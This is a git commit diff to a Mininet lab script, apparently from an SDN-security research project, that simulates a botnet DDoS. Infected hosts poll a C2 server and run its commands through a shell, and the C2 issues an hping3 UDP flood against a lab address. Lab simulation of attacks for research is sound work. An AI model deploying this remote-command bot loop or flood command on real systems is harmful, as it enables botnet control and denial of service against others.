a69717f596478322f23fadb52ab7d65621127cbd
Ozeliurs <ozeliurs@gmail.com>
2024-06-20 13:11:49 +0700

    feat: change lab script
    Ref: #7

--- papers/.project-files/ddos-attack/lab-setup.py
+++ papers/.project-files/ddos-attack/lab-setup.py
@@ -49,22 +49,22 @@ def create_network():
     # Start the network
     net.start()
 
-    # Install a simple webserver on h5 (attacker node (C2 Server))
-    h5.cmd('apt-get update && apt-get install -y apache2')
-    h5.cmd('service apache2 start')
-    # Create a command file
-    h5.cmd('echo "ls" > /var/www/html/command')
+    # Run a simple webserver on h5 (attacker node (C2 Server))
+    h6.cmd("python3 -m http.server -d /var/www/html 80 &")
 
     # Simulate Infection
     for host in [h2, h4, h5]:
-        host.cmd('wget https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/simple-virus.py -O virus.py')
-        host.cmd('python virus.py &')
+        # host.cmd('wget https://raw.githubusercontent.com/ozeliurs/SDN-Security/main/papers/.project-files/ddos-attack/simple-virus.py -O virus.py')
+        host.cmd('echo "import time\nimport urllib.request\nimport subprocess\n\nurl = \"http://10.42.0.6/command\"\n\nwhile True:\n    response = urllib.request.urlopen(url)\n    command = response.read().decode(\'utf-8\').strip()\n\n    print(command)\n\n    if command:\n        subprocess.call(command, shell=True)\n\n    time.sleep(10)" > virus.py')
+        print(host.cmd('python3 virus.py &'))
 
     # Start Monitoring
+    print("[+] Starting monitoring...")
     Popen("rm /tmp/mon.csv", shell=True).wait()
     Popen("bwm-ng -o csv -T rate -C ',' > /tmp/mon.csv &", shell=True).wait()
 
     # Start Capturing
+    print("[+] Starting capturing...")
     for i in range(1, 4):
         for j in range(1, 3):
             Popen(f"rm /tmp/s{i}-eth{j}.pcap", shell=True).wait()
@@ -73,12 +73,22 @@ def create_network():
     net.pingAll()
 
     # Wait for the network to stabilize
+    print("[+] Waiting for the network to stabilize...")
     time.sleep(10)
 
-    # Start the attack
-    h5.cmd('echo "hping3 -S --flood -V -p 80 10.42.0.1" > /var/www/html/command')
+    print("[+] Starting the attack...")
 
-    # ping h3 to h1 continuously until a key is pressed
+    # Start the attack
+    h5.cmd('echo "sudo hping3 --flood --udp 10.42.0.1 &" > /var/www/html/command')
+
+    if "Failed to connect to localhost port 80" in h2.cmd('curl http://10.42.0.6/command'):
+        print("[+] Failed to setup the C2 server. Please check the network configuration.")
+        return
+
+    print("[+] Waiting for the attack to take effect...")
+    time.sleep(10)
+
+    print("[+] Press Ctrl+C once to stop the attack...")
     try:
         while True:
             net.ping([h3, h1])
@@ -86,26 +96,29 @@ def create_network():
     except KeyboardInterrupt:
         pass
 
-    print("Stopping the attack...")
+    print("[+] Stopping the attack...")
 
     for host in [h2, h4, h5]:
         host.cmd('killall python')
+        host.cmd('killall hping3')
 
     # Wait for the network to stabilize
     time.sleep(10)
 
-    print("Stopping the monitoring...")
-
     # Stop the capturing
+    print("[+] Stopping the capturing...")
     Popen("killall tcpdump", shell=True).wait()
+
     # Stop the monitoring
+    print("[+] Stopping the monitoring...")
     Popen("killall bwm-ng", shell=True).wait()
 
-    print("Stopping the network...")
-
     # Stop the network
+    print("[+] Stopping the network...")
     net.stop()
 
+    print("[+] Tarring the results...")
+    Popen("tar -czvf /tmp/results.tar.gz /tmp/mon.csv /tmp/s*.pcap", shell=True).wait()
 
 if __name__ == '__main__':
     setLogLevel('info')
